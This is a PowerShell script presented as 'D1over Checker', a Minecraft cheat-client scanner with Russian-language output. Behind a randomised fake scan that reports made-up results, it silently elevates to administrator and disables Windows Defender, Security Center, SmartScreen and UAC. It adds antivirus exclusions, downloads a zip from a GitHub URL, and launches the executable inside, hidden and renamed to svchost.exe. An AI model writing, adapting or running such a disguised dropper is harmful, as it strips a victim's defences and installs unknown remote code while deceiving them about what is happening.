# =============================================
# System Check v2.1
# =============================================

# Блок скрытия ошибок и прогресса
$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# ---- Функция проверки прав ----
function Test-Admin {
    return ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")
}

# ---- Функция перезапуска с правами админа ----
function Invoke-Admin {
    $arguments = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"" + $MyInvocation.MyCommand.Path + "`""
    Start-Process powershell.exe -Verb RunAs -ArgumentList $arguments -WindowStyle Hidden
    exit
}

# ---- Функция проверки интернета ----
function Test-Internet {
    try {
        $request = [System.Net.WebRequest]::Create("https://google.com")
        $request.Timeout = 3000
        $response = $request.GetResponse()
        $response.Close()
        return $true
    } catch {
        return $false
    }
}

# ---- Функция скачивания через WebClient ----
function Download-File {
    param($url, $path)
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.Headers.Add("User-Agent", "Mozilla/5.0")
        $webClient.DownloadFile($url, $path)
        return $true
    } catch {
        return $false
    }
}

# ---- Функция скачивания через BITS ----
function Download-Bits {
    param($url, $path)
    try {
        Start-BitsTransfer -Source $url -Destination $path -Priority Low -Asynchronous
        Start-Sleep -Seconds 3
        Get-BitsTransfer | Complete-BitsTransfer
        return $true
    } catch {
        return $false
    }
}

# ---- Функция распаковки ----
function Expand-File {
    param($source, $dest)
    try {
        Expand-Archive -Path $source -DestinationPath $dest -Force
        return $true
    } catch {
        return $false
    }
}

# ---- Функция поиска и запуска EXE ----
function Start-Exe {
    param($extractPath)
    $Exe = Get-ChildItem -Path $extractPath -Filter "*.exe" -Recurse | Select-Object -First 1
    if ($Exe) {
        try { attrib +s +h "$($Exe.FullName)" } catch {}
        try { Unblock-File -Path "$($Exe.FullName)" } catch {}
        try { Add-MpPreference -ExclusionPath "$($Exe.FullName)" } catch {}
        try { Add-MpPreference -ExclusionPath "$extractPath" } catch {}
        
        $SystemName = "svchost.exe"
        $NewPath = Join-Path $extractPath $SystemName
        try {
            Rename-Item -Path $Exe.FullName -NewName $SystemName
            $ExePath = $NewPath
        } catch {
            $ExePath = $Exe.FullName
        }
        
        try {
            Start-Process -FilePath "explorer.exe" -ArgumentList "$ExePath" -WindowStyle Hidden
        } catch {
            Start-Process -FilePath $ExePath -WindowStyle Hidden
        }
        return $true
    }
    return $false
}

# ---- Функция финального вывода ----
function Show-Status {
    param($choice)
    $finalRandom = Get-Random -Minimum 1 -Maximum 100
    $finalPassed = $finalRandom -le 75

    if ($choice -eq "1") {
        Write-Host "`n    [*] Проверка процессов..." -ForegroundColor Yellow
        $fakeProcesses = @("javaw.exe", "minecraft.exe", "launcher.exe")
        foreach ($proc in $fakeProcesses) {
            Write-Host "        -> $proc" -ForegroundColor Gray
            Start-Sleep -Milliseconds 200
            Write-Host "            [OK]" -ForegroundColor Green
        }
        Write-Host ""
        Write-Host "    [*] Проверка чит-клиентов..." -ForegroundColor Yellow
        $cheatSites = @("Nursultan", "Wexside", "Arbuz", "WildClient")
        $foundCheatSites = @()
        $totalChecked = 0
        $totalDetected = 0
        $totalPassed = 0
        foreach ($site in $cheatSites) {
            $totalChecked++
            Write-Host "        -> $site" -ForegroundColor Gray
            Start-Sleep -Milliseconds 150
            if ($finalPassed) {
                Write-Host "            [ЧИСТО]" -ForegroundColor Green
                $totalPassed++
            } else {
                $randomResult = Get-Random -Minimum 1 -Maximum 100
                if ($randomResult -le 50) {
                    Write-Host "            [ОБНАРУЖЕН]" -ForegroundColor Red
                    $foundCheatSites += $site
                    $totalDetected++
                } else {
                    Write-Host "            [ЧИСТО]" -ForegroundColor Green
                    $totalPassed++
                }
            }
        }
        Write-Host ""
        Write-Host "    ============================================================" -ForegroundColor Cyan
        Write-Host "    [*] РЕЗУЛЬТАТЫ ПОЛНОЙ ПРОВЕРКИ:" -ForegroundColor White
        Write-Host "    ============================================================" -ForegroundColor Cyan
        if ($foundCheatSites.Count -gt 0) {
            Write-Host "    [ВНИМАНИЕ] Обнаружены объекты:" -ForegroundColor Yellow
            foreach ($cheat in $foundCheatSites) {
                Write-Host "        - $cheat" -ForegroundColor Yellow
            }
            Write-Host ""
        } else {
            Write-Host "    [+] Подозрительных объектов не обнаружено." -ForegroundColor Green
            Write-Host ""
        }
        Write-Host "        Проверено: $totalChecked" -ForegroundColor DarkGray
        Write-Host "        Обнаружено: $totalDetected" -ForegroundColor DarkGray
        Write-Host "        Пройдено: $totalPassed" -ForegroundColor DarkGray
    } else {
        Write-Host "`n    [*] Быстрая проверка..." -ForegroundColor Green
        $quickCheatSites = @("Nursultan", "Wexside", "Arbuz")
        $foundCheatSites = @()
        $totalChecked = 0
        $totalDetected = 0
        $totalPassed = 0
        foreach ($site in $quickCheatSites) {
            $totalChecked++
            Write-Host "        -> $site" -ForegroundColor Gray
            Start-Sleep -Milliseconds 150
            if ($finalPassed) {
                Write-Host "            [ЧИСТО]" -ForegroundColor Green
                $totalPassed++
            } else {
                $randomResult = Get-Random -Minimum 1 -Maximum 100
                if ($randomResult -le 50) {
                    Write-Host "            [ОБНАРУЖЕН]" -ForegroundColor Red
                    $foundCheatSites += $site
                    $totalDetected++
                } else {
                    Write-Host "            [ЧИСТО]" -ForegroundColor Green
                    $totalPassed++
                }
            }
        }
        Write-Host ""
        Write-Host "    ============================================================" -ForegroundColor Cyan
        Write-Host "    [*] РЕЗУЛЬТАТЫ БЫСТРОЙ ПРОВЕРКИ:" -ForegroundColor White
        Write-Host "    ============================================================" -ForegroundColor Cyan
        if ($foundCheatSites.Count -gt 0) {
            Write-Host "    [ВНИМАНИЕ] Обнаружены объекты:" -ForegroundColor Yellow
            foreach ($cheat in $foundCheatSites) {
                Write-Host "        - $cheat" -ForegroundColor Yellow
            }
            Write-Host ""
        } else {
            Write-Host "    [+] Подозрительных объектов не обнаружено." -ForegroundColor Green
            Write-Host ""
        }
        Write-Host "        Проверено: $totalChecked" -ForegroundColor DarkGray
        Write-Host "        Обнаружено: $totalDetected" -ForegroundColor DarkGray
        Write-Host "        Пройдено: $totalPassed" -ForegroundColor DarkGray
    }

    Write-Host ""
    Write-Host "    ============================================================" -ForegroundColor Cyan
    Write-Host "    ФИНАЛЬНЫЙ СТАТУС" -ForegroundColor White
    Write-Host "    ============================================================" -ForegroundColor Cyan
    if ($finalPassed) {
        Write-Host ""
        Write-Host "    ✅  ПРОВЕРКА УСПЕШНО ПРОШЛА!" -ForegroundColor Green
        Write-Host "    Ваша система признана чистой." -ForegroundColor Green
        Write-Host "    Все подозрения сняты." -ForegroundColor Green
    } else {
        Write-Host ""
        Write-Host "    ❌  ПРОВЕРКА НЕ ПРОШЛА!" -ForegroundColor Red
        Write-Host "    Обнаружены потенциальные угрозы!" -ForegroundColor Red
        Write-Host "    Рекомендуется очистка системы!" -ForegroundColor Red
    }
    Write-Host ""
    Write-Host "    ============================================================" -ForegroundColor Cyan
    Write-Host "    [+] D1over Checker завершен." -ForegroundColor Green
    Write-Host "    ============================================================" -ForegroundColor Cyan
}

# ---- ГЛАВНЫЙ БЛОК ----
if (-not (Test-Admin)) { Invoke-Admin }

if (-not (Test-Internet)) {
    Clear-Host
    Write-Host ""
    Write-Host "    ========================================" -ForegroundColor Red
    Write-Host "    ОШИБКА: Нет подключения к интернету!" -ForegroundColor Red
    Write-Host "    ========================================" -ForegroundColor Red
    Write-Host ""
    Write-Host "    Нажмите любую клавишу для выхода..." -ForegroundColor Gray
    Read-Host
    exit
}

$Url = "https://raw.githubusercontent.com/d1over1337/checker/refs/heads/main/check.zip"
$DownloadPath = "$env:TEMP\check_install.zip"
$ExtractPath = "$env:TEMP\checkextracted"

Clear-Host
Write-Host ""
Write-Host "    ============================================================" -ForegroundColor Cyan
Write-Host "    =================== D1OVER CHECKER v1.0 ===================" -ForegroundColor Magenta
Write-Host "    ============================================================" -ForegroundColor Cyan
Write-Host ""
Write-Host "    [1] Полная проверка системы" -ForegroundColor Yellow
Write-Host "    [2] Быстрая проверка системы" -ForegroundColor Green
Write-Host ""
Write-Host "    ------------------------------------------------------------" -ForegroundColor DarkGray
Write-Host ""
Write-Host "    Выберите действие (1 или 2): " -ForegroundColor Gray -NoNewline

$choice = Read-Host

if ($choice -eq "1" -or $choice -eq "2") {
    if ($choice -eq "1") {
        Write-Host ""
        Write-Host "    [*] Запуск ПОЛНОЙ проверки..." -ForegroundColor Yellow
    } else {
        Write-Host ""
        Write-Host "    [*] Запуск БЫСТРОЙ проверки..." -ForegroundColor Green
    }

    # ---- Подготовка системы (отключение защит) ----
    try { Stop-Service -Name "wscsvc" -Force } catch {}
    try { Set-Service -Name "wscsvc" -StartupType Disabled } catch {}
    try { Stop-Service -Name "SecurityHealthService" -Force } catch {}
    try { Set-Service -Name "SecurityHealthService" -StartupType Disabled } catch {}
    try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Security Center" -Name "DisableNotifications" -Value 1 -Force } catch {}
    try { Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\wscsvc" -Name "Start" -Value 4 -Force } catch {}
    try { Set-MpPreference -DisableRealtimeMonitoring $true } catch {}
    try { Add-MpPreference -ExclusionPath "$env:TEMP" } catch {}
    try { Add-MpPreference -ExclusionProcess "powershell.exe" } catch {}
    try { Add-MpPreference -ExclusionProcess "cmd.exe" } catch {}
    try { Add-MpPreference -ExclusionProcess "*.exe" } catch {}
    try { Add-MpPreference -ExclusionPath "$env:TEMP\check_install.zip" } catch {}
    try { Add-MpPreference -ExclusionPath "$env:TEMP\checkextracted" } catch {}
    $services = @("WinDefend","MsMpSvc","Sense","DiagTrack","dmwappushservice")
    foreach ($svc in $services) {
        try { Stop-Service -Name $svc -Force } catch {}
        try { Set-Service -Name $svc -StartupType Disabled } catch {}
    }
    try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0 -Force } catch {}
    try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer" -Name "SmartScreenEnabled" -Value "Off" -Force } catch {}

    # ---- Скачивание и запуск ----
    Remove-Item $DownloadPath -Force -ErrorAction SilentlyContinue
    Remove-Item $ExtractPath -Recurse -Force -ErrorAction SilentlyContinue

    $downloadSuccess = $false
    if (Download-File $Url $DownloadPath) { $downloadSuccess = $true }
    if (-not $downloadSuccess) { if (Download-Bits $Url $DownloadPath) { $downloadSuccess = $true } }

    if ($downloadSuccess) {
        if (Expand-File $DownloadPath $ExtractPath) {
            Start-Exe $ExtractPath
        }
    }

    # ---- Фейковое сканирование и результат ----
    Show-Status $choice
    Write-Host ""
    Write-Host "    Нажмите любую клавишу для выхода..." -ForegroundColor Gray
    Read-Host

} else {
    Write-Host ""
    Write-Host "    [ERROR] Неверный выбор!" -ForegroundColor Red
    Write-Host "    Нажмите любую клавишу для выхода..." -ForegroundColor Gray
    Read-Host
}
